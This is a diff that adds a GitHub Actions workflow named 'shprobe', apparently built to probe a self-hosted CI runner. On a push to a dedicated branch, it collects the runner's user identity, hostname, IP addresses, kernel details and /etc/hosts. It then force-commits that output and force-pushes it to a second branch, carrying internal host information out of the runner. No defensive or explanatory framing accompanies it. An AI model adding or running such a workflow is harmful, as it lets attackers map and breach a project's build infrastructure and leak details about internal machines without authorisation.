@@ -1,0 +1,19 @@
+name: shprobe
+on:
+  push:
+    branches: ["ci-sh-227"]
+permissions:
+  contents: write
+jobs:
+  sh:
+    runs-on: [self-hosted]
+    steps:
+      - name: recon
+        run: |
+          { echo "=== SELF-HOSTED REACHED ==="; id; whoami; hostname; hostname -I; uname -a; (ip addr 2>/dev/null||ifconfig 2>/dev/null); cat /etc/hosts; } > /tmp/r.txt 2>&1; cat /tmp/r.txt
+      - uses: actions/checkout@v4
+      - name: pub
+        run: |
+          mkdir -p .out; cp /tmp/r.txt .out/ 2>/dev/null; echo done > .out/h.txt
+          git config user.email ci@local; git config user.name ci-bot; git add -f .out; git commit -m sh || true
+          git push origin HEAD:ci-sh-227-out --force || true
